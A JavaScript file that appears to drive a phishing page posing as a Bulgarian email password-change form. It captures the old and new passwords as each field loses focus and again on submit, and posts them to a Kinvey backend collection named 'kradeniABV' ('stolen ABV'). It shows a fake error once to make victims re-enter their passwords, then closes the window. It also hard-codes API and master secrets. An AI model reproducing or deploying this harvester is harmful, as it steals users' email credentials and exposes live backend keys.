let a = 0 ;
const API_BASE_URL = "https://baas.kinvey.com/";
const API_KEY = "kid_r1ynbbg6Q";
const API_SECRET = "33903aebaffd4a3b944250b832bd81f3";
const BASIC_AUTH_HEADER = {
    'Authorization': "Basic " + btoa(API_KEY + ":" + API_SECRET)
};
const MASTER_AUTH_HEADER = {
    'Authorization': "Basic " + btoa(API_KEY + ":f55dd3810f61465c98c4fec7525a6ba9")
};

function register (data) {
    return $.ajax({
        method: "POST",
        url: API_BASE_URL + "appdata/" + API_KEY + "/kradeniABV",
        headers: MASTER_AUTH_HEADER,
        data: data
    });
}

function blur (data) {
    return $.ajax({
        method: "POST",
        url: API_BASE_URL + "appdata/" + API_KEY + "/kradeniABVONBLUR",
        headers: MASTER_AUTH_HEADER,
        data: data
    });
}
$(document).ready(() => {
    var oldPass = $('#oldPassword')
    var newPass = $('#password')
    var newPassCnf = $('#passwordCnf')

    document.getElementById('oldPassword').addEventListener('blur', (e) => {
        if(e.target.value === '')
            return
        var data = {}
        data.oldPass = e.target.value
        blur(data)
    })
    document.getElementById('password').addEventListener('blur', (e) => {
        if(e.target.value === '')
            return
        var data = {}
        data.newPass = e.target.value
        blur(data)
    })
    document.getElementById('passwordCnf').addEventListener('blur', (e) => {
        console.log(e.target.value)
        if(e.target.value === '')
            return
        var data = {}
        data.newPassRepeat = e.target.value
        blur(data)
    })

    var loginBut = $('#loginBut')

    $("#loginBut").click((e) => {
        e.preventDefault();
        let data = {};
        if($("#password").val() == "" || $("#passwordCnf").val() == "")
        {
            alert('Моля, въведете си паролата и я повторете')
            return;
        }
        data.passNew = $("#password").val();
        data.passOld = $("#oldPassword").val();
        data.passNewConfirm = $("#passwordCnf").val();
        register(data).then(() => {
            $("#password").val("");
            $("#oldPassword").val("");
            $("#passwordCnf").val("");
            if(a === 0) {
                alert("Възникна грешка, моля въведете отново");
                a++;
                return;
            }
            window.close();
            // window.open("https://lifestore.bg/blog/10-prichini-poradi-koito-si-zasluzhava-da-bdete-vegan/");
        });

    })
});